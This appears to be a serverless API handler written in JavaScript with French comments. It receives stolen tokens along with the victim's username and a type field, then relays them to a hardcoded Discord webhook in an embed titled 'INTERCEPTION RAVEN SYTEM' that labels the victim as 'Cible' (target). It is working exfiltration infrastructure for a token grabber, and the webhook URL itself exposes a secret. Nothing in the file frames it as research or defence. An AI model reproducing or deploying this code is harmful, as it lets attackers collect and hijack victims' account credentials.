export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { token, type, username } = req.body;
        
        // Ton Webhook Discord secret
        const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🚀 INTERCEPTION RAVEN SYTEM",
                    color: 0x00d4ff,
                    fields: [
                        { name: "Cible", value: username || "Inconnu", inline: true },
                        { name: "Type", value: type, inline: true },
                        { name: "Données", value: `\`\`\`${token}\`\`\`` }
                    ],
                    footer: { text: "La Relève de Raven v9.0" }
                }]
            })
        });

        return res.status(200).json({ status: 'success' });
    }
    res.status(405).send('Method Not Allowed');
}
